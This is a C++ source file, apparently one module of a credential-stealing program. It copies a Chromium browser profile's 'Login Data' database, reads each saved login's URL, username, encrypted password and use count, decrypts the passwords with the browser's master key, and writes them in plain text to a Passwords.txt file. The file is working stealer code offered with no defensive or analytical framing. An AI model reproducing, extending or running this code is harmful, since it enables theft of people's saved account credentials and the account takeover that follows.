//
// Created by .1qxz on 08.06.2024.
//

#include "CPasswords.h"

void CPasswords::execute(const fs::path &root, const std::string &name, const fs::path &path) {
    fs::path orig_db_path = path / this->getProfile() / "Login Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<Password> history = this->getPasswords(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(const Password &row : history)
    {
        if(row.password.empty() && row.username.empty())
            continue;

        ss << "Url: " << row.origin << "\n";
        ss << "  Username: " << row.username << "\n";
        ss << "  Password: " << row.password << "\n";
        ss << "  Used: " << std::to_string(row.times_used) << " times\n";
        ss << "\n";
    }

    Utils::writeFile(root / "Passwords.txt", ss.str());
}

std::list<Password> CPasswords::getPasswords(const fs::path &db_path) {
    std::list<Password> passwordList;
    sqlite3* db;
    sqlite3_stmt* stmt;
    int rc;

    rc = sqlite3_open(db_path.string().c_str(), &db);
    if (rc) {
        return {};
    }

    const char* sql = "SELECT origin_url, username_value, password_value, times_used FROM logins ORDER BY times_used DESC";
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return {};
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* origin_url = sqlite3_column_text(stmt, 0);
        const unsigned char* username_value = sqlite3_column_text(stmt, 1);
        const void* password_value = sqlite3_column_blob(stmt, 2);
        int password_size = sqlite3_column_bytes(stmt, 2);
        int times_used = sqlite3_column_int(stmt, 3);

        Password password_record;
        password_record.origin = std::string(reinterpret_cast<const char*>(origin_url));
        password_record.username = std::string(reinterpret_cast<const char*>(username_value));
        password_record.times_used = times_used;

        std::vector<BYTE> password_encrypted;
        password_encrypted.assign(static_cast<const BYTE*>(password_value), static_cast<const BYTE*>(password_value) + password_size);

        std::vector<BYTE> master_key = this->getMasterKey();
        std::string decoded_password = ChromiumUtil::decryptData(password_encrypted, master_key);
        password_record.password = decoded_password;

        passwordList.push_back(password_record);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return passwordList;
}
